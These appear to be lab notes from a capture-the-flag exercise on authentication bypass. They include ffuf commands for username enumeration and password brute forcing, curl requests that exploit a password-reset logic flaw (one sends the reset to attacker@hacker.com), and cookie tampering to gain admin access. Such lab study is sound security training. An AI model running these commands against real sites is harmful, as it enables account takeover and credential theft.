Authentication Bypass
==

Username Enumeration
--
If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://x.x.x.x/customers/signup -mr "username already exists"
```


Brute Force
--

```shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.239.245/customers/login -fc 200
```


Logic Flaw
--
Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.



```shell
curl 'http://10.10.239.245/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

```shell
curl 'http://10.10.239.245/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets.

```shell
u curl 'http://10.10.239.245/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

Cookie Tampering
--
### Plain Text

```shell
curl http://10.10.239.245/cookie-test
```
```shell
curl -H "Cookie: logged_in=true; admin=false" http://10.10.239.245/cookie-test
```
```shell
curl -H "Cookie: logged_in=true; admin=true" http://10.10.239.245/cookie-test
```
### Hashing

[Database](https://crackstation.net/) of billions of hashes and their original strings

decode base64 string

```shell
echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 --decode
```
encode string to base64
```shell
echo "mystring" | base64
```
